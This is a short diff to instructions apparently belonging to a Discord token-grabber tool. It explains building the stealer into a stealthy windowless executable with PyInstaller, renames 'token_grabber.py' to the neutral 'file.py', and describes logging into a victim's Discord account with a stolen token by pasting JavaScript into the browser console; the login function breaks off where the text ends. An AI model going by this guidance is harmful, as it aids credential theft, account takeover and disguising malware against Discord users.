@@ -1,4 +1,4 @@
-pyinstaller --onefile --windowed token_grabber.py
+pyinstaller --onefile --windowed file.py
 
 pyinstaller --- module to convert it
 
@@ -6,9 +6,9 @@ pyinstaller --- module to convert it
 
 --windowed --- if u want it stealthy use, if u want it to print text when executed dont use this option
 
-token_grabber.py --- the file
+file.py --- the file
 
-to login to discord with token, code is here.
+to login to discord with token, go to https://discord.com/login and inspect element, then go to console tab and paste the code.
 
 function login(token) {
 setInterval(() => {
